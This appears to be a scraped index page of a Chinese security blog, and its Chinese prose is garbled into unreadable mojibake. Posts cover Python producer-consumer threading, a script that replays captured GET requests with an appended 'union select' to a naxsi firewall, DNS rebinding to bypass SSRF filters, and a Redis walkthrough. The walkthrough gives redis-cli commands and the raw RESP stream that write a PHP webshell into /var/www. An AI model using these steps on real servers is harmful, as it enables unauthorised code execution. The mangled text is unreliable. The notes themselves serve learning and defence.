    <span class="token triple-quoted-string string">"""ç”Ÿäº§è€…çº¿ç¨‹"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>


<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""å¥‡æ•°æ¶ˆè´¹çº¿ç¨‹"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span> e
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>


q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç…§ç€å†™:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

from elasticsearch import Elasticsearch
import requests
from Queue import Queue
import time
import threading
import datetime

es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))


class Producter(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue
		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)


	def initsearch(self):
		dsl_query &#x3D; &#123;
		  &quot;query&quot;: &#123;
		    &quot;match&quot;: &#123;
		      &quot;method&quot;: &#123;
		        &quot;query&quot;: &quot;GET&quot;,
		        &quot;type&quot;: &quot;phrase&quot;
		      &#125;
		    &#125;
		  &#125;,
			&quot;size&quot;: 100,
		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
		&#125;
		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
		return latest_time


	def run(self):
		latest_time &#x3D; self.initsearch()
		while 1:
			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # è·å–æœ€æ–°çš„index
			dsl_query2 &#x3D; &#123;
				&quot;query&quot;: &#123;
					&quot;bool&quot;: &#123;
						&quot;must&quot;: &#123;
							&quot;match&quot;: &#123;
								&quot;method&quot;: &quot;GET&quot;
							&#125;
						&#125;,
						&quot;filter&quot;: &#123;
							&quot;range&quot;: &#123;
								&quot;@timestamp&quot;: &#123;
									&quot;gte&quot;: latest_time
								&#125;
							&#125;
						&#125;
					&#125;
				&#125;,
				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
				&quot;size&quot;: 1000
			&#125;
			time.sleep(10)
			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]


class Consumer(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue

	#
	# def http_curl(self):
	# 	# http_client &#x3D; AsyncHTTPClient()
	# 	path &#x3D; self.request[0]
	# 	param &#x3D; self.request[1]
	# 	method &#x3D; self.request[2]
	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
	# 		##åˆ¤æ–­getçš„paramæ˜¯å¦æ˜¯ç©º
	# 		if not param:
	# 			pass
	# 		else:
	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
	# 			print &quot;Curl %s&quot; % self.request
	# 			print rep.status_code
	# 	else:
	# 		#ç•™ç€å†™POSTè¯·æ±‚åˆ¤æ–­
	# 		pass


	def run(self):
		while 1:
			try:
				request &#x3D; self.queue.get()
				path &#x3D; request[0]
				param &#x3D; request[1]
				method &#x3D; request[2]
				if method &#x3D;&#x3D; &#39;GET&#39;:
					if not param:
						pass
					else:
						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
				#else  å†™POST
				print &quot;Get %s&quot; % request
				print rep.status_code
			except Exception as e:
				raise e

q &#x3D; Queue()
pt &#x3D; Producter(q)
ce &#x3D; Consumer(q)
ce.start()
pt.start()
pt.join()
ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç åº”è¯¥è¿˜æœ‰ç‚¹é—®é¢˜ï¼Œå…ˆè®°å½•ä¸‹å¤§æ¦‚çš„æµç¨‹ï¼š</p>
<p>ä½¿ç”¨: <code>packetbeat</code>åœ¨AæœåŠ¡å™¨æŠ“åŒ…ï¼Œæ ¼å¼åŒ–ä¹‹åæŠŠæ•°æ®å‘é€åˆ°BæœåŠ¡å™¨ï¼Œå­˜å‚¨åœ¨elké‡Œé¢ï¼Œç„¶åBæœåŠ¡å™¨ç”»å›¾å¯¹è¿™äº›è¯·æ±‚è¿›è¡Œåˆ†æï¼Œæ¯”å¦‚æŸä¸ªæ¥å£æŠ¥è­¦ä¹‹ç±»çš„ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™åœ¨BæœåŠ¡å™¨è®¾ç½®ä¸€ä¸ªnaxsié˜²ç«å¢™ä»£ç†ï¼Œç„¶åæŠŠesé‡Œé¢çš„è¾“å‡ºå–å‡ºæ¥ï¼Œå†å‘é€ä¸€éç»™Bã€‚ç»è¿‡æµ‹è¯•ï¼Œè™½ç„¶è¿™æ ·å­è¯·æ±‚å¤§éƒ¨åˆ†éƒ½æ˜¯404ï¼Œä½†æ˜¯å¦‚æœè¯·æ±‚ä¸­å­˜åœ¨æ¶æ„payloadï¼Œé˜²ç«å¢™ä¼šè®°å½•æ—¥å¿—ã€‚ï¼ˆæ‰€ä»¥è¿™é‡Œçš„è§„åˆ™è¦è®¾ç½®çš„ç‰¹åˆ«ä¸¥æ ¼ï¼Œä¸¥æ ¼åˆ°æ¯ä¸ªè¯·æ±‚éƒ½ä¸æ”¾è¿‡ï¼‰</p>
<p>ä¸Šé¢çš„è„šæœ¬å°±æ˜¯åœ¨Bé˜²ç«å¢™çš„è½¬å‘è„šæœ¬demoï¼Œæµ‹è¯•ä¸ºGETè¯·æ±‚ï¼Œå› ä¸ºPOSTè¯·æ±‚çš„bodyæ²¡æœ‰å­˜å‚¨åˆ°esé‡Œé¢ï¼Œè„šæœ¬çš„å¤§æ¦‚æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">å› ä¸ºesé‡Œé¢å­˜å‚¨çš„æ•°æ®åŒ…æ˜¯è¿™æ ·çš„æ ¼å¼: packet-[year]-[days]
æ‰€ä»¥å…ˆå¾—åˆ°ä»Šå¤©çš„æ—¥æœŸï¼Œéšä¾¿é€‰100æ¡ï¼Œè®°å½•æœ€æ–°çš„æ—¶é—´æˆ³ï¼Œæ­¤æ—¶åˆå§‹åŒ–å®Œæˆã€‚

ä¸‹é¢çš„è¯·æ±‚éƒ½æ˜¯åŸºäºè¿™ä¸ªæ—¶é—´æˆ³æ¥çš„ï¼Œæ¯éš”10sï¼Œåœ¨è¿™ä¸ªæ—¶é—´æˆ³çš„åŸºç¡€ä¸Šï¼Œè½®è¯¢è¯·æ±‚ä¸€æ¬¡esï¼Œç„¶åç»„è£…èµ·æ¥å‘é€åˆ°BæœåŠ¡å™¨ã€‚
è®°å½•ä¸‹æ¯æ¬¡è¯·æ±‚çš„æœ€æ–°æ—¥æœŸï¼Œç„¶åè¯·æ±‚è¿™ä¸ªindexï¼Œå› ä¸ºpacketçš„æ ¼å¼: packet-[year]-[days],æ‰€ä»¥è®°å½•ä¸‹æ¯æ¬¡è¯·æ±‚çš„æœ€æ–°æ—¶é—´ï¼Œæ ¼å¼åŒ–æŠ“å–æœ€æ–°çš„æ—¶é—´:

latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]

å½“esçš„å­˜å‚¨æ•°æ®æŒ‰ç…§å¤§äºæŸä¸ªæ—¶é—´ç‚¹å»ç­›é€‰çš„æ—¶å€™ï¼Œåªä¼šå‡ºç°åŒ¹é…çš„æ—¶é—´æ¡æ•°ï¼Œæ‰€ä»¥å¯ä»¥æŠŠè¯·æ±‚çš„sizeè®¾ç½®å¾—å¤§ä¸€ç‚¹
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æš‚æ—¶çš„é—®é¢˜ï¼š</p>
	
	</div>
  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/06/dns-rebinding.html" >DNS Rebinding</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åçš„é“¾æ¥æ˜¯å…³äºdns rebindingçš„æ–‡ç« ï¼Œè¿™é‡Œä¸»è¦åšä¸€ä¸ªç¬”è®°ï¼š</p>
<p>å…ˆç›—ç”¨ricterz.meçš„åšå®¢ä¸€ä¸ªå›¾<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>åœ¨ssrfçš„æ—¶å€™ï¼Œå®¢æˆ·ä¿®å¤è¿‡ä¹‹åã€‚å†æ¬¡åˆ¤æ–­urlçš„æ—¶å€™ï¼Œé€»è¾‘å°±æ˜¯ä¸Šå›¾è¿™ä¸ªæ ·å­ã€‚</p>
<ol>
<li>è·å–è¯·æ±‚çš„åœ°å€ï¼Œå¦‚æœæ˜¯åŸŸåï¼Œé€šè¿‡DNSè§£æçš„æ–¹å¼è·å–çœŸå®IPï¼Œå¦‚æœæ˜¯IPåˆ™ç›´æ¥å¯¹æ¯”æ˜¯å¦åœ¨æŒ‡å®šçš„IPæ®µå†…ã€‚</li>
<li>æ¯”å¦‚è·å–äº†test.loli.clubè¯·æ±‚åœ°å€æ˜¯10.0.0.1ï¼Œé»‘åå•æ˜¯10.0.0.0/8ï¼Œåˆ™æ‹’ç»è®¿é—®</li>
</ol>
<p>ä½¿ç”¨DNS Rebindingçš„ä¼šæœ‰è¿™æ ·çš„æ”»å‡»æ•ˆæœ:</p>
<ol>
<li>è·å–test.loli.clubçš„è¯·æ±‚åœ°å€ä¸æ˜¯10.0.0.0/8è¿™ä¸ªé»‘åå•èŒƒå›´é‡Œé¢</li>
<li>æ”¾è¡Œä¹‹åï¼Œç„¶ååç«¯è¯·æ±‚è¿™ä¸ªURLçš„èµ„æºã€‚å¦‚æœTTLè¶³å¤Ÿå°ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåˆå‘ç”Ÿä¸€æ¬¡DNSè§£æã€‚å¦‚æœè¿™ä¸ªURLå¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™æ¬¡çš„è§£æIPã€‚</li>
</ol>
<p>DNSè¿”å›çš„æ•°æ®åŒ…å­˜åœ¨ä¸€ä¸ªTTL(Time-to-Live),ä¹Ÿå°±æ˜¯åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´ã€‚å¦‚æœä¸¤æ¬¡DNSçš„è¯·æ±‚æ—¶é—´å¤§äºTTLï¼Œå°±ä¼šé‡æ–°è¿›è¡Œä¸€æ¬¡DNSè§£æè¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡å‘ç”ŸDNSè§£æçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªä¸åœ¨é»‘åå•çš„IPåœ°å€ï¼Œç¬¬äºŒæ¬¡æœåŠ¡ç«¯URLè¯·æ±‚çš„æ—¶å€™ï¼Œè®©æœåŠ¡å™¨è¿”å›ä¸€æ¬¡DNSè§£æï¼Œè§£æåˆ°é»‘åå•åœ°å€ï¼Œä»è€Œç»•è¿‡ã€‚</p>
<p>æ ¹æ®goychouå¤§ç¥çš„è„šæœ¬ï¼Œæµ‹è¯•ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>æ·»åŠ ä¸€ä¸ªAè®°å½•ï¼ŒåŸŸåæ˜¯ns.xyz.pwï¼ŒæŒ‡å‘æœåŠ¡å™¨A</li>
<li>å†æ·»åŠ ä¸€ä¸ªnsè®°å½•ï¼ŒåŸŸåæ˜¯rebind.xyz.pwï¼ŒæŒ‡å‘ns.xyz.pw</li>
</ul>
	

	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åçš„é“¾æ¥æ˜¯å…³äºdns rebindingçš„æ–‡ç« ï¼Œè¿™é‡Œä¸»è¦åšä¸€ä¸ªç¬”è®°ï¼š</p>
<p>å…ˆç›—ç”¨ricterz.meçš„åšå®¢ä¸€ä¸ªå›¾<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>åœ¨ssrfçš„æ—¶å€™ï¼Œå®¢æˆ·ä¿®å¤è¿‡ä¹‹åã€‚å†æ¬¡åˆ¤æ–­urlçš„æ—¶å€™ï¼Œé€»è¾‘å°±æ˜¯ä¸Šå›¾è¿™ä¸ªæ ·å­ã€‚</p>
<ol>
<li>è·å–è¯·æ±‚çš„åœ°å€ï¼Œå¦‚æœæ˜¯åŸŸåï¼Œé€šè¿‡DNSè§£æçš„æ–¹å¼è·å–çœŸå®IPï¼Œå¦‚æœæ˜¯IPåˆ™ç›´æ¥å¯¹æ¯”æ˜¯å¦åœ¨æŒ‡å®šçš„IPæ®µå†…ã€‚</li>
<li>æ¯”å¦‚è·å–äº†test.loli.clubè¯·æ±‚åœ°å€æ˜¯10.0.0.1ï¼Œé»‘åå•æ˜¯10.0.0.0/8ï¼Œåˆ™æ‹’ç»è®¿é—®</li>
</ol>
<p>ä½¿ç”¨DNS Rebindingçš„ä¼šæœ‰è¿™æ ·çš„æ”»å‡»æ•ˆæœ:</p>
<ol>
<li>è·å–test.loli.clubçš„è¯·æ±‚åœ°å€ä¸æ˜¯10.0.0.0/8è¿™ä¸ªé»‘åå•èŒƒå›´é‡Œé¢</li>
<li>æ”¾è¡Œä¹‹åï¼Œç„¶ååç«¯è¯·æ±‚è¿™ä¸ªURLçš„èµ„æºã€‚å¦‚æœTTLè¶³å¤Ÿå°ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåˆå‘ç”Ÿä¸€æ¬¡DNSè§£æã€‚å¦‚æœè¿™ä¸ªURLå¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™æ¬¡çš„è§£æIPã€‚</li>
</ol>
<p>DNSè¿”å›çš„æ•°æ®åŒ…å­˜åœ¨ä¸€ä¸ªTTL(Time-to-Live),ä¹Ÿå°±æ˜¯åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´ã€‚å¦‚æœä¸¤æ¬¡DNSçš„è¯·æ±‚æ—¶é—´å¤§äºTTLï¼Œå°±ä¼šé‡æ–°è¿›è¡Œä¸€æ¬¡DNSè§£æè¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡å‘ç”ŸDNSè§£æçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªä¸åœ¨é»‘åå•çš„IPåœ°å€ï¼Œç¬¬äºŒæ¬¡æœåŠ¡ç«¯URLè¯·æ±‚çš„æ—¶å€™ï¼Œè®©æœåŠ¡å™¨è¿”å›ä¸€æ¬¡DNSè§£æï¼Œè§£æåˆ°é»‘åå•åœ°å€ï¼Œä»è€Œç»•è¿‡ã€‚</p>
<p>æ ¹æ®goychouå¤§ç¥çš„è„šæœ¬ï¼Œæµ‹è¯•ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>æ·»åŠ ä¸€ä¸ªAè®°å½•ï¼ŒåŸŸåæ˜¯ns.xyz.pwï¼ŒæŒ‡å‘æœåŠ¡å™¨A</li>
<li>å†æ·»åŠ ä¸€ä¸ªnsè®°å½•ï¼ŒåŸŸåæ˜¯rebind.xyz.pwï¼ŒæŒ‡å‘ns.xyz.pw</li>
</ul>
	
	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Orangeåœ¨BHå¤§ä¼šçš„paperä¸Šé¢è¿™ä¹ˆè¯´çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Phåœ¨ä»–<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>é‡Œé¢ä¹Ÿæåˆ°è¿‡ï¼Œredisçš„åè®®æ˜¯ç®€å•çš„åè®®æµï¼Œå…³äºè¿™ä¸€ç‚¹å¯ä»¥æŸ¥çœ‹redisçš„å®˜æ–¹è§£é‡Š: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°ä½¿ç”¨gopheræ¥æ”»å‡»redisï¼Œä½¿ç”¨çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>redis-serverå¯åŠ¨çš„æ—¶å€™ç›‘å¬6378ç«¯å£ <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>è¿è¡Œ<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>ç„¶åå†æ­£å¸¸ä½¿ç”¨redisæ¥æ”»å‡»</li>
</ul>
<h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>ç›¸å½“äºæŠŠ6379çš„ç«¯å£æµé‡è½¬å‘åˆ°6378ï¼Œè€Œredis-serverç›‘å¬çš„æ˜¯6378ç«¯å£ï¼Œä½¿ç”¨redis-serveræ¥å†™shellæ˜¯è¿™æ ·çš„æ­¥éª¤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå¾—åˆ°çš„æ•°æ®æµå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Orangeåœ¨BHå¤§ä¼šçš„paperä¸Šé¢è¿™ä¹ˆè¯´çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Phåœ¨ä»–<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>é‡Œé¢ä¹Ÿæåˆ°è¿‡ï¼Œredisçš„åè®®æ˜¯ç®€å•çš„åè®®æµï¼Œå…³äºè¿™ä¸€ç‚¹å¯ä»¥æŸ¥çœ‹redisçš„å®˜æ–¹è§£é‡Š: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°ä½¿ç”¨gopheræ¥æ”»å‡»redisï¼Œä½¿ç”¨çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>redis-serverå¯åŠ¨çš„æ—¶å€™ç›‘å¬6378ç«¯å£ <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>è¿è¡Œ<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>ç„¶åå†æ­£å¸¸ä½¿ç”¨redisæ¥æ”»å‡»</li>
</ul>
<h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>ç›¸å½“äºæŠŠ6379çš„ç«¯å£æµé‡è½¬å‘åˆ°6378ï¼Œè€Œredis-serverç›‘å¬çš„æ˜¯6378ç«¯å£ï¼Œä½¿ç”¨redis-serveræ¥å†™shellæ˜¯è¿™æ ·çš„æ­¥éª¤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå¾—åˆ°çš„æ•°æ®æµå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/28/sql-bypass-unknown.html" >SQLæ³¨å…¥ç»•è¿‡æœªçŸ¥å­—æ®µåçš„æŠ€å·§</a>
		</h3>
		</div>
	<div class="col-md-4">
